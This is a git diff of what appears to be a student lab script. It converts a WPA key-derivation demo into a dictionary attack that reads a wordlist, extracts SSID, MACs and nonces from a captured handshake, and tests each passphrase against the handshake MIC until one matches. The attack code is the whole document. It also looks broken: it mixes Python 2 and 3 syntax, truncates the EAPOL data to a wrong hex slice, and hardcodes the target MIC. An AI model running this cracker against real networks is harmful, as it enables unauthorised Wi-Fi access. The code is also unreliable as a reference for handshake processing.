@@ -22,6 +22,7 @@ from pbkdf2_math import pbkdf2_hex
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
+import string as st
 
 def customPRF512(key,A,B):
     """
@@ -37,61 +38,80 @@ def customPRF512(key,A,B):
     return R[:blen]
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
-wpa=rdpcap("wpa_handshake.cap") 
+wpa=rdpcap("wpa_handshake.cap")
 
+# Read dictionnary of the file wordlist.txt
+fname = "wordlist.txt"
+
+with open(fname) as f:
+    wordArray = []
+    for line in f:
+        wordArray.append(line)
+
+print(wordArray)
+
+for i in range(0, len(wordArray)):
+    wordArray[i] = wordArray[i].rstrip("\n")
+
+print(wordArray)
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-ssid        = "SWI"
-APmac       = a2b_hex("cebcc8fdcab7")
-Clientmac   = a2b_hex("0013efd015bd")
+ssid        = wpa[0].info
+APmac       = wpa[0].addr2
+APmac       = a2b_hex(APmac.replace(":",""))
+Clientmac   = wpa[1].addr1
+Clientmac   = a2b_hex(Clientmac.replace(":",""))
 
 # Authenticator and Supplicant Nonces
-ANonce      = a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")
-SNonce      = a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")
+ANonce      = a2b_hex(wpa[5].load.encode('hex')[26:90])
+SNonce      = a2b_hex(wpa[6].load.encode('hex')[26:90])
 
-# This is the MIC contained in the 4th frame of the 4-way handshake
-# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
+for passPhrase in wordArray:
 
-B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
+    # This is the MIC contained in the 4th frame of the 4-way handshake
+    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
+    mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
 
-data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
+    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
-print("\n\nValues used to derivate keys")
-print("============================")
-print("Passphrase: ",passPhrase,"\n")
-print("SSID: ",ssid,"\n")
-print("AP Mac: ",b2a_hex(APmac),"\n")
-print("Client Mac: ",b2a_hex(Clientmac),"\n")
-print("AP Nonce: ",b2a_hex(ANonce),"\n")
-print("Client Nonce: ",b2a_hex(SNonce),"\n")
+    data = "0103005f" + wpa[8].load.encode('hex')
+    data = data[len(data)-36:len(data)]
 
-print("\n\n***************************** Test lecture passphrase *****************************")
+    print "data"
+    print "===="
+    print "data", wpa[8].load.encode('hex'), "\n"
+
+    print "\n\nValues used to derivate keys"
+    print "============================"
+    print "Passphrase: ", passPhrase, "\n"
+    print "SSID: ", ssid, "\n"
+    print "AP Mac: ", b2a_hex(APmac), "\n"
+    print "Client Mac: ", b2a_hex(Clientmac), "\n"
+    print "AP Nonce: ", b2a_hex(ANonce), "\n"
+    print "Client Nonce: ", b2a_hex(SNonce), "\n"
+
+    print("\n\n***************************** Test lecture passphrase *****************************")
+
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
+
+    #expand pmk to obtain PTK
+    ptk = customPRF512(a2b_hex(pmk),A,B)
+
+    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
 
-# Récupération des valeurs écrites en dure
-print("\n\nPrint en recupérant les données de wpa")
-print("============================")
-print("SSID: ", wpa[0].info)
-print("AP Mac: ", wpa[0].addr2)
-# addr2 Adresse source, addr1 adresse de destination
-print("Client Mac: ", wpa[1].addr1)
-# La trame 6 (wpa[5]) du fichier wpa_handshake.cap contient le Nonce de l'AP
-print("AP Nonce: ", wpa[5].load.encode('hex')[26:90])
+    mic_to_compare = mic.hexdigest()[0:len(mic_to_test)]
+    print(type(mic.hexdigest()))
+    print("new mic: ", mic_to_compare)
+    print(type(mic_to_test))
+    print("mic to test: ", mic_to_test)
 
-# La trame 7 (wpa[6]) du fichier wpa_handshake.cap contient le Nonce du client
-print("Client Nonce: ", wpa[6].load.encode('hex')[26:90])
-
-
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
-
-#expand pmk to obtain PTK
-ptk = customPRF512(a2b_hex(pmk),A,B)
-
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+    if mic_to_compare == mic_to_test:
+        print("YES WE DID IT")
+        print(passPhrase)
+        break;
 
 
 print("\nResults of the key expansion")
